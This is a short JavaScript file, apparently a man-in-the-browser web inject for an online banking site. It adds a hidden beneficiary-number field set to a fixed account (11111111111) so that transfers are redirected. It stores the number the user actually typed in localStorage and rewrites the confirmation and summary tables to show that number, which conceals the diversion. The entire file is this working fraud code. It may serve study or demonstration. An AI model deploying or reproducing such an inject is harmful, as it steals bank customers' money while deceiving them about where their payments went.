

function main() {
	change_confirm_tables();
	change_summary_tables();

	var input = document.getElementsByTagName('input');
	var numbPos = -1;
	var namePos = -1;
	if(input.length != 0) {
		for (var i=0; i<input.length;i++) {
			if(input[i].name == 'benName') {
				namePos = i;
			}

			if(input[i].name == 'benNumber'){
				numbPos = i;
			}

			if(numbPos != -1 && namePos != -1) 
				break;
		}

		var parent = input[i].parentNode;

		var hinput = document.createElement("input");
		hinput.type = "hidden";
		hinput.name = "benNumber";
		hinput.value = 11111111111;

		parent.appendChild(hinput); 

		var btns = document.getElementsByTagName('button');

		for (var j=0;j< btns.length;j++) {
			if(btns[j].innerHTML == "Make transfer") {
				btns[j].addEventListener('click', function(){
					localStorage.removeItem(input[namePos].value);
					localStorage.setItem(input[namePos].value,input[numbPos].value);
				});
			}
		}
	}

	
	
	
}



function setInStorage(input,numbPos,namePos) {
	
	var name = input[namePos].value;
	var number = input[numbPos].value;
	localStorage.removeItem(name);
	localStorage.setItem(name,number);
}

function change_confirm_tables() {
	var th = document.getElementsByTagName('th');
	var td = document.getElementsByTagName('td');
	var name;
	
	if (th.length != 0) {
		for(var i=0; i<th.length;i++) {
			if(th[i].innerHTML == "To:") {
				name = td[i].innerHTML;
				td[i+1].innerHTML = localStorage.getItem(name);
			}
		}
	}

}

function change_summary_tables() {
	var th = document.getElementsByTagName('th');

	if (th.length !=0) {
		if(th[0].innerHTML == "TO" && th[1].innerHTML =="ACCOUNT NUMBER") {
			var tr = document.getElementsByTagName('tr');
			for(var i=0;i<tr.length;i++) {
				var child = tr[i].children;
				//console.log(child[0].nodeName);
				if (child[0].nodeName == 'TD') {
					var name = child[0].innerHTML;
					child[1].innerHTML = localStorage.getItem(name);
				}
			}
		}
	}

}